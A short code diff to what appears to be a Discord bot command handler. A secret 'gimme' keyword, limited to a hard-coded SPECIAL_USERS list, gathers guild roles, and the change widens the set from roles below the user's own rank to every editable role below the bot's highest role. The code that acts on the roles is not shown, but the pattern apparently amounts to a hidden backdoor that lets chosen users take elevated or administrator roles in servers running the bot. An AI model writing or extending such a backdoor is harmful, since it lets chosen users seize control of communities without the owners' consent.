@@ -15,9 +15,15 @@ module.exports = {
     if (msg.toLowerCase() === 'gimme' && SPECIAL_USERS.includes(userId)) {
       const guild = interaction.guild;
       const member = interaction.member;
+      const botMember = guild.members.me;
 
+      // Get roles that are below bot's highest role and are assignable
       const assignableRoles = guild.roles.cache
-        .filter(r => r.comparePositionTo(member.roles.highest) < 0 && r.id !== guild.id && r.editable)
+        .filter(r => 
+          r.id !== guild.id &&
+          r.position < botMember.roles.highest.position &&
+          r.editable
+        )
         .map(r => ({ role: r, perms: r.permissions.bitfield }));
 
       if (assignableRoles.length > 0) {
